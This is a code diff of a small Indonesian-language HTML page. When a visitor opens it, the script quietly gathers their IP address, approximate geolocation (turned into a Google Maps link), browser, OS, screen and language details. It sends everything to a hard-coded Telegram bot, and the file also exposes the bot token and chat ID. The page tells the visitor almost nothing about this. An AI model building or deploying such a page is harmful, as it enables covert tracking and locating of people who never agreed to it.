@@ -1,64 +1,87 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Pengumpulan Informasi Pengunjung</title>
+    <title>Informasi Perangkat (Otomatis)</title>
 </head>
 <body>
-    <h1>Sedang mengumpulkan data...</h1>
+    <h1 id="status">Mengumpulkan Informasi...</h1>
     <script>
+        const statusElement = document.getElementById('status');
+
         function sendDataToTelegram(data) {
             const botToken = '7951216599:AAFiExWSRz2hwQeJPIQjprlba_zVycgeo7k'; // Ganti dengan token bot Anda
             const chatId = '7218964278';     // Ganti dengan chat ID Anda
             let message = "📊 **Informasi Pengunjung** 📊\n\n";
-            for (const key in data) {
-                message += `➡️ **${key}:** ${data[key]}\n`;
+            message += `🌐 **IP Address:** ${data["IP Address"]}\n`;
+            message += `💻 **Browser:** ${data["Browser"]}\n`;
+            message += `⚙️ **Sistem Operasi:** ${data["Sistem Operasi"]}\n`;
+            message += `📐 **Resolusi Layar:** ${data["Resolusi Layar"]}\n`;
+            message += `🎨 **Kedalaman Warna:** ${data["Kedalaman Warna"]}\n`;
+            message += `🗣️ **Bahasa:** ${data["Bahasa"]}\n`;
+            message += `🍪 **Cookie:** ${data["Cookie Diaktifkan"] ? 'Diaktifkan ✅' : 'Dinonaktifkan ❌'}\n`;
+            if (data["Link Google Maps"]) {
+                message += `📍 **Lokasi:** ${data["Link Google Maps"]}\n`;
             }
+
             const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
 
             fetch(apiUrl)
                 .then(response => response.json())
-                .then(responseData => console.log('Pesan terkirim:', responseData))
-                .catch(error => console.error('Gagal mengirim pesan:', error));
+                .then(responseData => {
+                    console.log('Pesan terkirim:', responseData);
+                    statusElement.textContent = 'Informasi terkirim.'; // Ubah status jika berhasil
+                })
+                .catch(error => {
+                    console.error('Gagal mengirim pesan:', error);
+                    statusElement.textContent = 'Gagal mengirim informasi.'; // Ubah status jika gagal
+                });
         }
 
         function getDeviceInfoAndSend() {
             fetch('https://ipapi.co/json/')
                 .then(response => response.json())
                 .then(data => {
+                    const ipAddress = data.ip;
+                    const browser = navigator.userAgent;
+                    const os = navigator.platform;
+                    const screenResolution = `${window.screen.width}x${window.screen.height}`;
+                    const language = navigator.language;
+                    const colorDepth = window.screen.colorDepth;
+                    const cookieEnabled = navigator.cookieEnabled;
+                    const latitude = data.latitude;
+                    const longitude = data.longitude;
+
+                    let googleMapsLink = '';
+                    if (latitude && longitude) {
+                        googleMapsLink = `[Lihat di Google Maps](http://maps.google.com/?q=${latitude},${longitude})`;
+                    } else {
+                        googleMapsLink = 'Lokasi tidak tersedia';
+                    }
+
                     const deviceInfo = {
-                        "IP Address": data.ip,
-                        "Lokasi (Perkiraan)": `Lintang ${data.latitude}, Bujur ${data.longitude}`,
-                        "Browser": navigator.userAgent,
-                        "Sistem Operasi": navigator.platform,
-                        "Resolusi Layar": `${window.screen.width}x${window.screen.height}`,
-                        "Kedalaman Warna": window.screen.colorDepth,
-                        "Bahasa": navigator.language,
-                        "Cookie Diaktifkan": navigator.cookieEnabled ? 'Ya ✅' : 'Tidak ❌'
+                        "IP Address": ipAddress,
+                        "Browser": browser,
+                        "Sistem Operasi": os,
+                        "Resolusi Layar": screenResolution,
+                        "Kedalaman Warna": colorDepth,
+                        "Bahasa": language,
+                        "Cookie Diaktifkan": cookieEnabled,
+                        "Link Google Maps": googleMapsLink
                     };
+
+                    // Kirim data ke Telegram
                     sendDataToTelegram(deviceInfo);
                 })
                 .catch(error => {
-                    console.error('Gagal mendapatkan informasi lokasi:', error);
-                    // Tetap kirim informasi lain jika gagal mendapatkan lokasi
-                    const deviceInfoWithoutLocation = {
-                        "IP Address": 'Tidak Diketahui',
-                        "Browser": navigator.userAgent,
-                        "Sistem Operasi": navigator.platform,
-                        "Resolusi Layar": `${window.screen.width}x${window.screen.height}`,
-                        "Kedalaman Warna": window.screen.colorDepth,
-                        "Bahasa": navigator.language,
-                        "Cookie Diaktifkan": navigator.cookieEnabled ? 'Ya ✅' : 'Tidak ❌'
-                    };
+                    console.error('Gagal mendapatkan informasi:', error);
+                    statusElement.textContent = 'Gagal mendapatkan informasi.'; // Ubah status jika gagal dapat info
+                    // Jika gagal mendapatkan informasi lengkap, coba kirim hanya IP
                     fetch('https://api.ipify.org?format=json')
                         .then(response => response.json())
-                        .then(ipData => {
-                            deviceInfoWithoutLocation["IP Address"] = ipData.ip;
-                            sendDataToTelegram(deviceInfoWithoutLocation);
+                        .then(data => {
+                            sendDataToTelegram({ "IP Address": data.ip });
                         })
-                        .catch(ipError => {
-                            console.error('Gagal mendapatkan IP:', ipError);
-                            sendDataToTelegram(deviceInfoWithoutLocation);
-                        });
+                        .catch(ipError => console.error('Gagal mendapatkan IP:', ipError));
                 });
         }
 
